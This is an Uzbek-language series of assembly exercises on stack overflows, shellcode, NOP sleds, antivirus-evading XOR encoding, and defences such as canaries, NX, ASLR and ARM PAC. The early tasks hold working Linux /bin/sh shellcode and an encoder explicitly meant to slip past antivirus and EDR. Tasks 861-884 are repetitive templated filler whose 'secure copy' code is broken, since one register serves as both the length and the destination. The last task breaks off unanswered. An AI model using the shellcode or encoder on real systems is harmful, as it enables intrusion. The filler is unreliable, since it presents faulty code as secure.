# 851-Topshiriq: Kiberxavfsizlik: Stek to'lib ketishi (Stack Buffer Overflow) mexanizmi
## Topshiriq sharti:
Kiberxavfsizlik va zaifliklar tahlili: Kiberxavfsizlik: Stek to'lib ketishi (Stack Buffer Overflow) mexanizmi.

## Yechim (Assembly kodi):
```assembly
; Zaif funksiya assembly ko'rinishi
vulnerable_function:
    push rbp
    mov rbp, rsp
    sub rsp, 32          ; 32 bayt mahalliy bufer
    lea rdi, [rbp-32]
    call gets            ; gets() chegara tekshirmaydi!
    leave
    ret                  ; Agar rbp+8 qaytish manzili buzilgan bo'lsa, xaker manziliga sakraydi
```

## Tushuntirish va Mantiq:
Foydalanuvchi 32 baytdan ortiq ma'lumot kiritganda, stekdagi `rbp` va undan keyingi `return address` (qaytish manzili) qayta yoziladi (overwrite), bu esa kod ijrosini boshqarish imkonini beradi.

## Ishlash natijasi:
```text
Dastur boshqaruvi begona manzilga o'tishi yoki Segmentation Fault ro'y berishi mumkin.
```


# 852-Topshiriq: Linux x86_64 Execve '/bin/sh' Shellcode yaratish
## Topshiriq sharti:
Kiberxavfsizlik va zaifliklar tahlili: Linux x86_64 Execve '/bin/sh' Shellcode yaratish.

## Yechim (Assembly kodi):
```assembly
section .text
global _start
_start:
    ; Null baytlardan (0x00) xoli shellcode
    xor rdx, rdx         ; rdx = 0 (envp = NULL)
    push rdx             ; '\0' qator yakuni
    mov rax, 0x68732f2f6e69622f ; '//bin/sh' teskari tartibda (little-endian)
    push rax
    mov rdi, rsp         ; rdi = '/bin/sh' manzili
    push rdx             ; argv[1] = NULL
    push rdi             ; argv[0] = '/bin/sh'
    mov rsi, rsp         ; rsi = argv massiv manzili
    xor rax, rax
    mov al, 59           ; sys_execve (59)
    syscall
```

## Tushuntirish va Mantiq:
Ushbu shellcode hech qanday null baytga ega emas, chunki `xor` va `mov al` dan foydalanilgan. U Linuxda `/bin/sh` qobig'ini ishga tushiradi.

## Ishlash natijasi:
```text
/bin/sh terminal qobig'i ishga tushadi.
```


# 853-Topshiriq: Null-Free Shellcode texnikasi (Tushuntirish va misol)
## Topshiriq sharti:
Kiberxavfsizlik va zaifliklar tahlili: Null-Free Shellcode texnikasi (Tushuntirish va misol).

## Yechim (Assembly kodi):
```assembly
; 0x00 bayti bo'lmasligi uchun registrlarni tozalash usullari:
; YOMON: mov rax, 0      -> 48 C7 C0 00 00 00 00 (Null baytlar ko'p)
; YAXSHI: xor eax, eax   -> 31 C0 (Null bayt yo'q)
; YOMON: mov rdi, 1      -> 48 C7 C7 01 00 00 00
; YAXSHI: push 1 / pop rdi -> 6A 01 5F (Null bayt yo'q, hajmi 3 bayt)
```

## Tushuntirish va Mantiq:
Satr nusxalovchi funksiyalar (`strcpy`) 0x00 baytini satr oxiri deb bilib nusxalashni to'xtatadi. Shuning uchun shellcode null-free bo'lishi talab etiladi.

## Ishlash natijasi:
```text
Natijada ixcham va cheklovlarsiz inyeksiya qilinuvchi baytlar hosil bo'ladi.
```


# 854-Topshiriq: NOP Sled (NOP Chana) texnikasi
## Topshiriq sharti:
Kiberxavfsizlik va zaifliklar tahlili: NOP Sled (NOP Chana) texnikasi.

## Yechim (Assembly kodi):
```assembly
; NOP Sled: Ko'p sonli 0x90 (NOP) baytlaridan so'ng shellcode joylashtiriladi
section .text
global _start
_start:
    nop
    nop
    nop
    nop                  ; va boshqa NOP baytlari...
    ; Shellcode boshlanishi
    xor edi, edi
    mov eax, 60
    syscall
```

## Tushuntirish va Mantiq:
NOP (0x90) hech qanday amal bajarmaydi. Xaker aniq xotira manzilini bilmaganda, taxminiy oraliqqa sakraydi va protsessor NOP'lar bo'ylab sirg'alib asosiy shellcodega yetib keladi.

## Ishlash natijasi:
```text
Dastur xavfsiz holda shellcodeni ishga tushirishga erishadi.
```


# 855-Topshiriq: Stack Canary (SSP - Stack Smashing Protector) mexanizmi
## Topshiriq sharti:
Kiberxavfsizlik va zaifliklar tahlili: Stack Canary (SSP - Stack Smashing Protector) mexanizmi.

## Yechim (Assembly kodi):
```assembly
safe_function:
    push rbp
    mov rbp, rsp
    sub rsp, 48
    ; Stek canary qiymatini joylashtirish
    mov rax, [fs:0x28]    ; TLS (Thread Local Storage) dan tasodifiy kanareyka olish
    mov [rbp-8], rax     ; Stekka saqlash
    xor eax, eax

    ; ... foydalanuvchi kodi bu yerda ...

    ; Funksiyadan chiqishda tekshirish
    mov rax, [rbp-8]
    xor rax, [fs:0x28]
    jne .stack_smash_fail ; Agar o'zgargan bo'lsa xatolik
    leave
    ret
.stack_smash_fail:
    call __stack_chk_fail ; Jarayon zudlik bilan to'xtatiladi
```

## Tushuntirish va Mantiq:
Stack Canary stekdagi mahalliy o'zgaruvchilar va qaytish manzili o'rtasiga qo'yiladi. Agar bufer toshsa, canary buziladi va dastur buzilgan qaytish manziliga o'tmasdan to'xtatiladi.

## Ishlash natijasi:
```text
*** stack smashing detected ***: terminated
```


# 856-Topshiriq: XOR Encoder: Shellcodeni antiviruslardan yashirish
## Topshiriq sharti:
Kiberxavfsizlik va zaifliklar tahlili: XOR Encoder: Shellcodeni antiviruslardan yashirish.

## Yechim (Assembly kodi):
```assembly
; Shellcodeni bitta kalit bilan shifrlash va xotirada dekodlash
section .text
global _start
_start:
    lea rsi, [rel encrypted_payload]
    mov rcx, payload_len
    mov al, 0x5A         ; XOR kaliti
.decode_loop:
    xor byte [rsi], al
    inc rsi
    loop .decode_loop
    jmp encrypted_payload

encrypted_payload:
    db 0x31 ^ 0x5A, 0xc0 ^ 0x5A, 0x48 ^ 0x5A ; Shifrlangan baytlar
payload_len equ $ - encrypted_payload
```

## Tushuntirish va Mantiq:
Statik signature tahlil qiluvchi EDR va antiviruslarni chalg'itish uchun shellcode XOR amali orqali shifrlanadi va ishga tushish vaqtida (runtime) xotirada tiklanadi.

## Ishlash natijasi:
```text
Shellcode xotirada muvaffaqiyatli deshifrlanadi va ishga tushadi.
```


# 857-Topshiriq: ARM64 da Stack Smashing va Himoya (Pointer Authentication - PAC)
## Topshiriq sharti:
Kiberxavfsizlik va zaifliklar tahlili: ARM64 da Stack Smashing va Himoya (Pointer Authentication - PAC).

## Yechim (Assembly kodi):
```assembly
// ARM64 PAC (Pointer Authentication Code) namunasi
.global secure_func
secure_func:
    paciasp              // Qaytish manzili (LR/x30) ga kriptografik imzo qo'yish
    stp x29, x30, [sp, #-16]!
    mov x29, sp

    // ... ishchi kod ...

    ldp x29, x30, [sp], #16
    autiasp              // Qaytish manzilining imzosini tekshirish
    ret                  // Agar imzo buzilgan bo'lsa, xavfli manzilga o'tilmaydi
```

## Tushuntirish va Mantiq:
ARMv8.3-A arxitekturasida joriy etilgan PAC texnologiyasi qaytish manzillarini apparat darajasida shifrlash orqali ROP va stek buzilishlarining oldini oladi.

## Ishlash natijasi:
```text
Qaytish manzili yaxlitligi apparat darajasida tekshiriladi.
```


# 858-Topshiriq: Integer Overflow (Butun son to'lib ketishi) xavfsizlik oqibati
## Topshiriq sharti:
Kiberxavfsizlik va zaifliklar tahlili: Integer Overflow (Butun son to'lib ketishi) xavfsizlik oqibati.

## Yechim (Assembly kodi):
```assembly
; C kodi: size_t total = count * size; void *buf = malloc(total);
; Agar count juda katta bo'lsa, ko'paytirish to'lib ketib kichik son bo'lib qoladi
mov rax, rdi             ; count
mul rsi                  ; rdx:rax = count * size
jo .overflow_detected   ; Overflow bayrog'i (OF) tekshiriladi
mov rdi, rax
call malloc
ret
.overflow_detected:
xor rax, rax             ; Xatolik (NULL qaytarish)
ret
```

## Tushuntirish va Mantiq:
Integer overflow natijasida bufer uchun juda kam xotira ajratiladi, lekin keyinchalik katta hajm yozilib, Heap Overflow zaifligi kelib chiqadi.

## Ishlash natijasi:
```text
To'lib-toshish aniqlanib xatolik qaytariladi.
```


# 859-Topshiriq: DEP / NX (Data Execution Prevention / No-Execute bit)
## Topshiriq sharti:
Kiberxavfsizlik va zaifliklar tahlili: DEP / NX (Data Execution Prevention / No-Execute bit).

## Yechim (Assembly kodi):
```assembly
; NX biti stek va xip (heap) xotiralarida kod bajarilishini taqiqlaydi
; mprotect tizim chaqiruvi orqali xotira sahifasiga bajarish (EXEC) ruxsatini berish:
mov rax, 10              ; sys_mprotect
mov rdi, target_page_addr ; 4KB ga tekislangan manzil
mov rsi, 4096            ; Hajmi 1 sahifa
mov rdx, 7               ; PROT_READ | PROT_WRITE | PROT_EXEC
syscall
```

## Tushuntirish va Mantiq:
Zamonaviy OT larda W^X (Write XOR Execute) siyosati mavjud. NX biti yoqilgan bo'lsa, stekdagi shellcode bajarilmaydi (SIGSEGV).

## Ishlash natijasi:
```text
Sahifaga ijro ruxsati beriladi yoki ruxsatsiz kod to'xtatiladi.
```


# 860-Topshiriq: ASLR (Address Space Layout Randomization) tushunchasi va PIE
## Topshiriq sharti:
Kiberxavfsizlik va zaifliklar tahlili: ASLR (Address Space Layout Randomization) tushunchasi va PIE.

## Yechim (Assembly kodi):
```assembly
; ASLR dastur ishga tushgan har gal stek, kutubxonalar va binar bazasini tasodifiy manzilga joylashtiradi
; PIE (Position Independent Executable) kod yozish:
lea rax, [rel global_var] ; Mutlaq manzil o'rniga RIP-nisbiy manzil
mov rbx, [rax]
ret
```

## Tushuntirish va Mantiq:
ASLR mavjud bo'lganda statik xotira manzillariga tayanib bo'lmaydi. Dastur kodi RIP-relative usulda tuzilishi lozim.

## Ishlash natijasi:
```text
Kod xotiradagi ixtiyoriy bazaviy manzilda muvaffaqiyatli ishlay oladi.
```


# 861-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #1
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #1 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #1
check_security_invariant_1:
    cmp rdi, 0x0001
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0001 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #1 muvaffaqiyatli amalga oshirildi.
```


# 862-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #2
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #2 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #2
check_security_invariant_2:
    cmp rdi, 0x0002
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0002 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #2 muvaffaqiyatli amalga oshirildi.
```


# 863-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #3
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #3 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #3
check_security_invariant_3:
    cmp rdi, 0x0003
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0003 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #3 muvaffaqiyatli amalga oshirildi.
```


# 864-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #4
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #4 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #4
check_security_invariant_4:
    cmp rdi, 0x0004
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0004 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #4 muvaffaqiyatli amalga oshirildi.
```


# 865-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #5
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #5 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #5
check_security_invariant_5:
    cmp rdi, 0x0005
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0005 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #5 muvaffaqiyatli amalga oshirildi.
```


# 866-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #6
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #6 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #6
check_security_invariant_6:
    cmp rdi, 0x0006
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0006 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #6 muvaffaqiyatli amalga oshirildi.
```


# 867-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #7
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #7 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #7
check_security_invariant_7:
    cmp rdi, 0x0007
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0007 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #7 muvaffaqiyatli amalga oshirildi.
```


# 868-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #8
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #8 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #8
check_security_invariant_8:
    cmp rdi, 0x0008
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0008 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #8 muvaffaqiyatli amalga oshirildi.
```


# 869-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #9
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #9 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #9
check_security_invariant_9:
    cmp rdi, 0x0009
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0009 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #9 muvaffaqiyatli amalga oshirildi.
```


# 870-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #10
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #10 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #10
check_security_invariant_10:
    cmp rdi, 0x000A
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x000A / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #10 muvaffaqiyatli amalga oshirildi.
```


# 871-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #11
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #11 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #11
check_security_invariant_11:
    cmp rdi, 0x000B
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x000B / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #11 muvaffaqiyatli amalga oshirildi.
```


# 872-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #12
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #12 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #12
check_security_invariant_12:
    cmp rdi, 0x000C
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x000C / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #12 muvaffaqiyatli amalga oshirildi.
```


# 873-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #13
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #13 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #13
check_security_invariant_13:
    cmp rdi, 0x000D
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x000D / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #13 muvaffaqiyatli amalga oshirildi.
```


# 874-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #14
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #14 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #14
check_security_invariant_14:
    cmp rdi, 0x000E
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x000E / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #14 muvaffaqiyatli amalga oshirildi.
```


# 875-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #15
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #15 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #15
check_security_invariant_15:
    cmp rdi, 0x000F
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x000F / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #15 muvaffaqiyatli amalga oshirildi.
```


# 876-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #16
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #16 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #16
check_security_invariant_16:
    cmp rdi, 0x0010
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0010 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #16 muvaffaqiyatli amalga oshirildi.
```


# 877-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #17
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #17 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #17
check_security_invariant_17:
    cmp rdi, 0x0011
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0011 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #17 muvaffaqiyatli amalga oshirildi.
```


# 878-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #18
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #18 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #18
check_security_invariant_18:
    cmp rdi, 0x0012
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0012 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #18 muvaffaqiyatli amalga oshirildi.
```


# 879-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #19
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #19 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #19
check_security_invariant_19:
    cmp rdi, 0x0013
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0013 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #19 muvaffaqiyatli amalga oshirildi.
```


# 880-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #20
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #20 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #20
check_security_invariant_20:
    cmp rdi, 0x0014
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0014 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #20 muvaffaqiyatli amalga oshirildi.
```


# 881-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #21
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #21 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #21
check_security_invariant_21:
    cmp rdi, 0x0015
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0015 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #21 muvaffaqiyatli amalga oshirildi.
```


# 882-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #22
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #22 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #22
check_security_invariant_22:
    cmp rdi, 0x0016
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0016 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #22 muvaffaqiyatli amalga oshirildi.
```


# 883-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #23
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #23 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #23
check_security_invariant_23:
    cmp rdi, 0x0017
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0017 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #23 muvaffaqiyatli amalga oshirildi.
```


# 884-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #24
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #24 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #24
check_security_invariant_24:
    cmp rdi, 0x0018
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0018 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #24 muvaffaqiyatli amalga oshirildi.
```


# 885-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #25
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #25 talabini bajaring.

